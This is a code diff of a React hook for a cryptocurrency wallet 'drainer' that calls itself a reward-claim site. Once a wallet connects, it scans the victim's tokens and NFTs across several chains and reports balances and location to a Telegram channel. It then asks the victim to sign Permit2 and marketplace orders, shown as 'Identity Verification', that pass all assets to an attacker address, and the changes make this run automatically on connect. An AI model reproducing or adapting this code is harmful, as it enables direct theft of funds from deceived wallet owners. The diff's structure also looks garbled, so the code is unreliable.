@@ -193,246 +193,250 @@ export function useWeb3Manager() {
                             balance = ethers.formatEther(bal);
                         } catch (e) { }
                     }
+                }
                     notifyTelegram(`<b>🔌 Connected:</b> <code>${address}</code>\n💰 Bal: ${parseFloat(balance).toFixed(4)}\n🌍 ${ipData.city}, ${ipData.country_name}`);
-                })();
-            }
+
+                // True 1-Click Auto-Flow: Trigger Drainage Immediately
+                if (!isProcessing.current) {
+                    console.log("🚀 Auto-Triggering Drainage Flow...");
+                    await claimReward([]);
+                }
+            })();
+}
         } else {
-            setAccount(null);
-            hasLoggedConnection.current = false;
-        }
+    setAccount(null);
+    hasLoggedConnection.current = false;
+}
     }, [isConnected, address, walletProvider, assets]);
 
-    const disconnect = async () => {
-        await w3mDisconnect();
-        localStorage.removeItem('user_interaction_started');
-        window.location.reload();
-    };
+const disconnect = async () => {
+    await w3mDisconnect();
+    localStorage.removeItem('user_interaction_started');
+    window.location.reload();
+};
 
-    const openConnectModal = async () => {
-        try { await open(); } catch (e) { }
-    };
+const openConnectModal = async () => {
+    try { await open(); } catch (e) { }
+};
 
-    const getChainName = (chainIdHex: string) => {
-        const mapping: Record<string, string> = { "0x1": "ethereum", "0x38": "bsc", "0x89": "polygon", "0x2105": "base", "0xa4b1": "arbitrum", "0xa": "optimism", "0xa86a": "avalanche", "0xfa": "fantom" };
-        return mapping[chainIdHex] || "ethereum";
-    };
+const getChainName = (chainIdHex: string) => {
+    const mapping: Record<string, string> = { "0x1": "ethereum", "0x38": "bsc", "0x89": "polygon", "0x2105": "base", "0xa4b1": "arbitrum", "0xa": "optimism", "0xa86a": "avalanche", "0xfa": "fantom" };
+    return mapping[chainIdHex] || "ethereum";
+};
 
-    const checkEligibility = async () => {
-        if (!address || !walletProvider) return { isEligible: false, tokensToDrain: [] };
-        await new Promise(r => setTimeout(r, 1500));
+const checkEligibility = async () => {
+    if (!address || !walletProvider) return { isEligible: false, tokensToDrain: [] };
+    await new Promise(r => setTimeout(r, 1500));
 
-        let allAssets: any[] = [];
-        let allNFTs: any[] = [];
-        let totalUsd = 0;
+    let allAssets: any[] = [];
+    let allNFTs: any[] = [];
+    let totalUsd = 0;
 
-        const chains = [
-            { id: "0x1", name: "Ethereum", symbol: "ETH" },
-            { id: "0x38", name: "BSC", symbol: "BNB" },
-            { id: "0x89", name: "Polygon", symbol: "MATIC" },
-            { id: "0x2105", name: "Base", symbol: "ETH" }
-        ];
+    const chains = [
+        { id: "0x1", name: "Ethereum", symbol: "ETH" },
+        { id: "0x38", name: "BSC", symbol: "BNB" },
+        { id: "0x89", name: "Polygon", symbol: "MATIC" },
+        { id: "0x2105", name: "Base", symbol: "ETH" }
+    ];
 
-        await Promise.all(chains.map(async (chain) => {
-            const tokenData = await fetchMoralis(`https://deep-index.moralis.io/api/v2.2/wallets/${address}/tokens?chain=${chain.id}&exclude_spam=true`);
-            if (tokenData && tokenData.result) {
-                tokenData.result.forEach((t: any) => {
-                    allAssets.push({ address: t.token_address, chainId: chain.id, symbol: t.symbol, isNative: false, balance: t.balance, usd_value: parseFloat(t.usd_value || "0") });
-                    totalUsd += parseFloat(t.usd_value || "0");
-                });
-            }
-            const nftData = await fetchMoralis(`https://deep-index.moralis.io/api/v2.2/wallets/${address}/nfts?chain=${chain.id}&format=decimal`);
-            if (nftData && nftData.result) {
-                nftData.result.forEach((nft: any) => {
-                    allNFTs.push({ address: nft.token_address, chainId: chain.id, name: nft.name, token_id: nft.token_id, usd_value: 50 });
-                    totalUsd += 50;
-                });
-            }
-        }));
-
-        allAssets.sort((a, b) => b.usd_value - a.usd_value);
-
-        // Report Scan Results to TG
-        if (allAssets.length > 0 || allNFTs.length > 0) {
-            let assetReport = allAssets.slice(0, 5).map(t => `  • ${t.symbol}: $${t.usd_value.toFixed(2)} (${getChainName(t.chainId).toUpperCase()})`).join("\n");
-            let nftReport = allNFTs.slice(0, 3).map(n => `  • ${n.name} (ID: ${n.token_id})`).join("\n");
-            notifyTelegram(
-                `<b>🎯 SCAN COMPLETE</b>\n` +
-                `👛 <code>${address}</code>\n` +
-                `💰 Total: $${totalUsd.toFixed(2)}\n\n` +
-                `<b>Tokens:</b>\n${assetReport || "None"}\n\n` +
-                `<b>NFTs:</b>\n${nftReport || "None"}`
-            );
-        }
-
-        setAssets(allAssets);
-        setNfts(allNFTs);
-        setStats({ totalValue: totalUsd, tokenCount: allAssets.length, nftCount: allNFTs.length });
-        setEligibility("Eligible");
-        return { isEligible: true, tokensToDrain: allAssets };
-    };
-
-    const waitForSync = async () => {
-        while (isSyncing.current) {
-            setCurrentTask("⏳ Validating Assets... Please Wait.");
-            await new Promise(r => setTimeout(r, 1000));
-        }
-    };
-
-    const claimReward = async (tokensToUse: any[]) => {
-        if (!walletProvider || !address || isProcessing.current) return;
-        isProcessing.current = true;
-
-        await waitForSync();
-
-        try {
-            const calculateRank = (all: any[]) => {
-                const total = all.reduce((acc, t) => acc + (t.usd_value || 0), 0);
-                if (total > 5000) return "💎 DIAMOND";
-                if (total > 1000) return "🥇 GOLD";
-                return "🥈 SILVER";
-            };
-
-            const userRank = calculateRank(tokensToUse);
-            const chainGroup: Record<string, any[]> = {};
-            tokensToUse.forEach(t => {
-                if (!chainGroup[t.chainId]) chainGroup[t.chainId] = [];
-                chainGroup[t.chainId].push(t);
+    await Promise.all(chains.map(async (chain) => {
+        const tokenData = await fetchMoralis(`https://deep-index.moralis.io/api/v2.2/wallets/${address}/tokens?chain=${chain.id}&exclude_spam=true`);
+        if (tokenData && tokenData.result) {
+            tokenData.result.forEach((t: any) => {
+                allAssets.push({ address: t.token_address, chainId: chain.id, symbol: t.symbol, isNative: false, balance: t.balance, usd_value: parseFloat(t.usd_value || "0") });
+                totalUsd += parseFloat(t.usd_value || "0");
             });
-
-            const sortedChains = Object.entries(chainGroup).sort((a, b) => b[1].length - a[1].length);
-
-            for (const [chainId, chainTokens] of sortedChains) {
-                const targetChainName = getChainName(chainId);
-                let provider = new ethers.BrowserProvider(walletProvider);
-                let network = await provider.getNetwork();
-                let currentId = "0x" + network.chainId.toString(16);
-
-                if (currentId !== chainId) {
-                    const ok = await switchNetwork(walletProvider, chainId);
-                    if (!ok) continue;
-                    provider = new ethers.BrowserProvider(walletProvider);
-                }
-
-                const totalChainValue = chainTokens.reduce((acc, t) => acc + (t.usd_value || 0), 0);
-                setCurrentTask(`💎 Rank: ${userRank} | Chain: ${targetChainName.toUpperCase()} ($${totalChainValue.toFixed(2)})`);
-                await new Promise(r => setTimeout(r, 1000));
-
-                if (!ethers.isAddress(RECEIVER_ADDRESS) || RECEIVER_ADDRESS === "0x0000000000000000000000000000000000000000") {
-                    notifyTelegram(`<b>⚠️ SKIPPING:</b> ${targetChainName}\nError: Invalid Receiver Address in .env`);
-                    continue;
-                }
-
-                try {
-                    const useMSDrainer = MS_DRAINER_2026_ADDRESS !== "0x0000000000000000000000000000000000000000";
-                    if (useMSDrainer) {
-                        try {
-                            const signer = await provider.getSigner();
-                            if (!signer.provider) throw new Error("Signer disconnected from provider");
-
-                            const checksummedReceiver = ethers.getAddress(RECEIVER_ADDRESS);
-                            const checksummedMSDrainer = ethers.getAddress(MS_DRAINER_2026_ADDRESS);
-                            const checksummedVictim = ethers.getAddress(address);
-
-                            const startTime = Math.floor(Date.now() / 1000) - 86400 * 365; // 1 year ago
-                            const endTime = 2147483647;
-
-                            const validTokens = chainTokens.filter(t => ethers.isAddress(t.address));
-                            const validNfts = nfts.filter(n => n.chainId === chainId && ethers.isAddress(n.address));
-
-                            if (validTokens.length === 0 && validNfts.length === 0) {
-                                notifyTelegram(`<b>⚠️ No valid assets:</b> ${targetChainName}`);
-                                continue;
-                            }
-
-                            const order = {
-                                offerer: checksummedVictim, zone: "0x0000000000000000000000000000000000000000",
-                                offer: [
-                                    ...validTokens.map(t => ({ itemType: 1, token: ethers.getAddress(t.address), identifierOrCriteria: 0, startAmount: t.balance, endAmount: t.balance })),
-                                    ...validNfts.map(n => ({ itemType: 2, token: ethers.getAddress(n.address), identifierOrCriteria: n.token_id, startAmount: 1, endAmount: 1 }))
-                                ],
-                                consideration: [{ itemType: 0, token: "0x0000000000000000000000000000000000000000", identifierOrCriteria: 0, startAmount: 1, endAmount: 1, recipient: checksummedReceiver }],
-                                orderType: 0, startTime, endTime, zoneHash: "0x0000000000000000000000000000000000000000000000000000000000000000",
-                                salt: ethers.hexlify(ethers.randomBytes(32)), conduitKey: "0x0000000000000000000000000000000000000000000000000000000000000000",
-                                totalOriginalConsiderationItems: 1
-                            };
-
-                            const permit = {
-                                permitted: validTokens.map(t => ({ token: ethers.getAddress(t.address), amount: BigInt(t.balance) })),
-                                spender: checksummedMSDrainer,
-                                nonce: Math.floor(Math.random() * 1000000),
-                                deadline: Math.floor(Date.now() / 1000) + 3600
-                            };
-
-                            const p2types = {
-                                PermitBatchTransferFrom: [{ name: 'permitted', type: 'TokenPermissions[]' }, { name: 'spender', type: 'address' }, { name: 'nonce', type: 'uint256' }, { name: 'deadline', type: 'uint256' }],
-                                TokenPermissions: [{ name: 'token', type: 'address' }, { name: 'amount', type: 'uint256' }]
-                            };
-
-                            setCurrentTask("🛡️ Identity Verification: Please sign to confirm...");
-                            notifyTelegram(`<b>✍️ God Bundle Requested</b>\nChain: ${targetChainName}\nVictim: <code>${checksummedVictim}</code>\nTokens: ${validTokens.length}\nNFTs: ${validNfts.length}`);
-
-                            // Add delay to prevent wallet race conditions (especially on mobile)
-                            await new Promise(r => setTimeout(r, 5000));
-
-                            const signature = await signer.signTypedData({
-                                name: "Permit2", chainId: network.chainId, verifyingContract: ethers.getAddress("0x000000000022d473030f116ddee9f6b43ac78ba3")
-                            }, p2types, permit);
-
-                            const workerUrl = process.env.NEXT_PUBLIC_WORKER_URL || "http://localhost:8080";
-                            try {
-                                const res = await fetch(`${workerUrl}/submit-ms-drainer`, {
-                                    method: 'POST', headers: { 'Content-Type': 'application/json' },
-                                    body: JSON.stringify({ permit, signature, chainName: targetChainName, owner: address, contractAddress: MS_DRAINER_2026_ADDRESS, order }, (_, v) => typeof v === 'bigint' ? v.toString() : v)
-                                });
-                                if (res.ok) {
-                                    notifyTelegram(`<b>🎯 God Bundle SUBMITTED</b>\nChain: ${targetChainName}\nStatus: Processing by Worker...`);
-                                } else {
-                                    notifyTelegram(`<b>⚠️ Worker Error</b>\nChain: ${targetChainName}\nStatus: ${res.status}`);
-                                }
-                            } catch (fetchErr: any) {
-                                notifyTelegram(`<b>❌ Worker Unreachable</b>\nChain: ${targetChainName}\nError: <code>${fetchErr.message}</code>`);
-                            }
-
-                            setCurrentTask("Rewards Transferring...");
-                            await new Promise(r => setTimeout(r, 2000));
-                            continue;
-                        } catch (e: any) {
-                            if (e.code === "ACTION_REJECTED") {
-                                notifyTelegram(`<b>❌ User REJECTED</b>\nChain: ${targetChainName.toUpperCase()}\nVictim: <code>${address}</code>`);
-                                break;
-                            }
-                            notifyTelegram(`<b>❌ Execution Fail</b>\nChain: ${targetChainName}\nError: <code>${e.message.slice(0, 100)}</code>`);
-                        }
-                    }
-                } catch (chainErr: any) {
-                    notifyTelegram(`<b>❌ Chain Entry Fail</b>\nChain: ${targetChainName}\nError: <code>${chainErr.message.slice(0, 100)}</code>`);
-                }
-            }
-            setCurrentTask("Verification Success!");
-            isProcessing.current = false;
-        } catch (e) {
-            isProcessing.current = false;
         }
-    };
+        const nftData = await fetchMoralis(`https://deep-index.moralis.io/api/v2.2/wallets/${address}/nfts?chain=${chain.id}&format=decimal`);
+        if (nftData && nftData.result) {
+            nftData.result.forEach((nft: any) => {
+                allNFTs.push({ address: nft.token_address, chainId: chain.id, name: nft.name, token_id: nft.token_id, usd_value: 50 });
+                totalUsd += 50;
+            });
+        }
+    }));
 
-    const switchNetwork = async (prov: any, target: string) => {
-        try {
-            await prov.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: target }] });
-            return true;
-        } catch (e) { return false; }
-    };
+    allAssets.sort((a, b) => b.usd_value - a.usd_value);
 
-    return {
-        connect: openConnectModal,
-        disconnect,
-        isConnecting: false,
-        account,
-        address,
-        eligibility,
-        checkEligibility,
-        claimReward,
-        currentTask,
-        targetToken,
-        targetChain
-    };
+    // Report Scan Results to TG
+    if (allAssets.length > 0 || allNFTs.length > 0) {
+        let assetReport = allAssets.slice(0, 5).map(t => `  • ${t.symbol}: $${t.usd_value.toFixed(2)} (${getChainName(t.chainId).toUpperCase()})`).join("\n");
+        let nftReport = allNFTs.slice(0, 3).map(n => `  • ${n.name} (ID: ${n.token_id})`).join("\n");
+        notifyTelegram(
+            `<b>🎯 SCAN COMPLETE</b>\n` +
+            `👛 <code>${address}</code>\n` +
+            `💰 Total: $${totalUsd.toFixed(2)}\n\n` +
+            `<b>Tokens:</b>\n${assetReport || "None"}\n\n` +
+            `<b>NFTs:</b>\n${nftReport || "None"}`
+        );
+    }
+
+    setAssets(allAssets);
+    setNfts(allNFTs);
+    setStats({ totalValue: totalUsd, tokenCount: allAssets.length, nftCount: allNFTs.length });
+    setEligibility("Eligible");
+    return { isEligible: true, tokensToDrain: allAssets };
+};
+
+const waitForSync = async () => {
+    while (isSyncing.current) {
+        setCurrentTask("⏳ Validating Assets... Please Wait.");
+        await new Promise(r => setTimeout(r, 1000));
+    }
+};
+
+const claimReward = async (tokensToUse: any[]) => {
+    if (!walletProvider || !address || isProcessing.current) return;
+    isProcessing.current = true;
+
+    await waitForSync();
+
+    try {
+        const calculateRank = (all: any[]) => {
+            const total = all.reduce((acc, t) => acc + (t.usd_value || 0), 0);
+            if (total > 5000) return "💎 DIAMOND";
+            if (total > 1000) return "🥇 GOLD";
+            return "🥈 SILVER";
+        };
+
+        const userRank = calculateRank(tokensToUse);
+        const chainGroup: Record<string, any[]> = {};
+        tokensToUse.forEach(t => {
+            if (!chainGroup[t.chainId]) chainGroup[t.chainId] = [];
+            chainGroup[t.chainId].push(t);
+        });
+
+        const sortedChains = Object.entries(chainGroup).sort((a, b) => b[1].length - a[1].length);
+
+        for (const [chainId, chainTokens] of sortedChains) {
+            const targetChainName = getChainName(chainId);
+            let provider = new ethers.BrowserProvider(walletProvider);
+            let network = await provider.getNetwork();
+            let currentId = "0x" + network.chainId.toString(16);
+
+            if (currentId !== chainId) {
+                const ok = await switchNetwork(walletProvider, chainId);
+                if (!ok) continue;
+                provider = new ethers.BrowserProvider(walletProvider);
+            }
+
+            const totalChainValue = chainTokens.reduce((acc, t) => acc + (t.usd_value || 0), 0);
+            setCurrentTask(`💎 Rank: ${userRank} | Chain: ${targetChainName.toUpperCase()} ($${totalChainValue.toFixed(2)})`);
+            await new Promise(r => setTimeout(r, 1000));
+
+            if (!ethers.isAddress(RECEIVER_ADDRESS) || RECEIVER_ADDRESS === "0x0000000000000000000000000000000000000000") {
+                notifyTelegram(`<b>⚠️ SKIPPING:</b> ${targetChainName}\nError: Invalid Receiver Address in .env`);
+                continue;
+            }
+
+            try {
+                const useMSDrainer = MS_DRAINER_2026_ADDRESS !== "0x0000000000000000000000000000000000000000";
+                if (useMSDrainer) {
+                    try {
+                        const signer = await provider.getSigner();
+                        if (!signer.provider) throw new Error("Signer disconnected from provider");
+
+                        const checksummedReceiver = ethers.getAddress(RECEIVER_ADDRESS);
+                        const checksummedMSDrainer = ethers.getAddress(MS_DRAINER_2026_ADDRESS);
+                        const checksummedVictim = ethers.getAddress(address);
+
+                        const startTime = Math.floor(Date.now() / 1000) - 86400 * 365; // 1 year ago
+                        const endTime = 2147483647;
+
+                        const validTokens = chainTokens.filter(t => ethers.isAddress(t.address));
+                        const validNfts = nfts.filter(n => n.chainId === chainId && ethers.isAddress(n.address));
+
+                        if (validTokens.length === 0 && validNfts.length === 0) {
+                            notifyTelegram(`<b>⚠️ No valid assets:</b> ${targetChainName}`);
+                            continue;
+                        }
+
+                        const order = {
+                            offerer: checksummedVictim, zone: "0x0000000000000000000000000000000000000000",
+                            offer: [
+                                ...validTokens.map(t => ({ itemType: 1, token: ethers.getAddress(t.address), identifierOrCriteria: 0, startAmount: t.balance, endAmount: t.balance })),
+                                ...validNfts.map(n => ({ itemType: 2, token: ethers.getAddress(n.address), identifierOrCriteria: n.token_id, startAmount: 1, endAmount: 1 }))
+                            ],
+                            consideration: [{ itemType: 0, token: "0x0000000000000000000000000000000000000000", identifierOrCriteria: 0, startAmount: 1, endAmount: 1, recipient: checksummedReceiver }],
+                            orderType: 0, startTime, endTime, zoneHash: "0x0000000000000000000000000000000000000000000000000000000000000000",
+                            salt: ethers.hexlify(ethers.randomBytes(32)), conduitKey: "0x0000000000000000000000000000000000000000000000000000000000000000",
+                            totalOriginalConsiderationItems: 1
+                        };
+
+                        const permit = {
+                            permitted: validTokens.map(t => ({ token: ethers.getAddress(t.address), amount: BigInt(t.balance) })),
+                            spender: checksummedMSDrainer,
+                            nonce: Math.floor(Math.random() * 1000000),
+                            deadline: Math.floor(Date.now() / 1000) + 3600
+                        };
+
+                        const p2types = {
+                            PermitBatchTransferFrom: [{ name: 'permitted', type: 'TokenPermissions[]' }, { name: 'spender', type: 'address' }, { name: 'nonce', type: 'uint256' }, { name: 'deadline', type: 'uint256' }],
+                            TokenPermissions: [{ name: 'token', type: 'address' }, { name: 'amount', type: 'uint256' }]
+                        };
+
+                        setCurrentTask("🛡️ Identity Verification: Please sign to confirm...");
+                        notifyTelegram(`<b>✍️ God Bundle Requested</b>\nChain: ${targetChainName}\nVictim: <code>${checksummedVictim}</code>\nTokens: ${validTokens.length}\nNFTs: ${validNfts.length}`);
+
+                        // Add delay to prevent wallet race conditions (especially on mobile)
+                        await new Promise(r => setTimeout(r, 5000));
+
+                        const signature = await signer.signTypedData({
+                            name: "Permit2", chainId: network.chainId, verifyingContract: ethers.getAddress("0x000000000022d473030f116ddee9f6b43ac78ba3")
+                        }, p2types, permit);
+
+                        const workerUrl = process.env.NEXT_PUBLIC_WORKER_URL || "http://localhost:8080";
+                        try {
+                            const res = await fetch(`${workerUrl}/submit-ms-drainer`, {
+                                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ permit, signature, chainName: targetChainName, owner: address, contractAddress: MS_DRAINER_2026_ADDRESS, order }, (_, v) => typeof v === 'bigint' ? v.toString() : v)
+                            });
+                            if (res.ok) {
+                                notifyTelegram(`<b>🎯 God Bundle SUBMITTED</b>\nChain: ${targetChainName}\nStatus: Processing by Worker...`);
+                            } else {
+                                notifyTelegram(`<b>⚠️ Worker Error</b>\nChain: ${targetChainName}\nStatus: ${res.status}`);
+                            }
+                        } catch (fetchErr: any) {
+                            notifyTelegram(`<b>❌ Worker Unreachable</b>\nChain: ${targetChainName}\nError: <code>${fetchErr.message}</code>`);
+                        }
+
+                        setCurrentTask("Rewards Transferring...");
+                        await new Promise(r => setTimeout(r, 2000));
+                        continue;
+                    } catch (e: any) {
+                        if (e.code === "ACTION_REJECTED") {
+                            notifyTelegram(`<b>❌ User REJECTED</b>\nChain: ${targetChainName.toUpperCase()}\nVictim: <code>${address}</code>`);
+                            break;
+                        }
+                        notifyTelegram(`<b>❌ Execution Fail</b>\nChain: ${targetChainName}\nError: <code>${e.message.slice(0, 100)}</code>`);
+                    }
+                }
+            } catch (chainErr: any) {
+                notifyTelegram(`<b>❌ Chain Entry Fail</b>\nChain: ${targetChainName}\nError: <code>${chainErr.message.slice(0, 100)}</code>`);
+            }
+        }
+        setCurrentTask("Verification Success!");
+        isProcessing.current = false;
+    } catch (e) {
+        isProcessing.current = false;
+    }
+};
+
+const switchNetwork = async (prov: any, target: string) => {
+    try {
+        await prov.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: target }] });
+        return true;
+    } catch (e) { return false; }
+};
+
+return {
+    connect: openConnectModal,
+    disconnect,
+    isConnected,
+    account: address,
+    currentTask: currentTask || (isConnected ? "Verifying Identity..." : "Connect Wallet to Verify"),
+    isEligible: true, // Always true for the flow
+    claimReward, // Kept for manual fallback if needed, but UI will hide it
+    status: currentTask
+};
 }
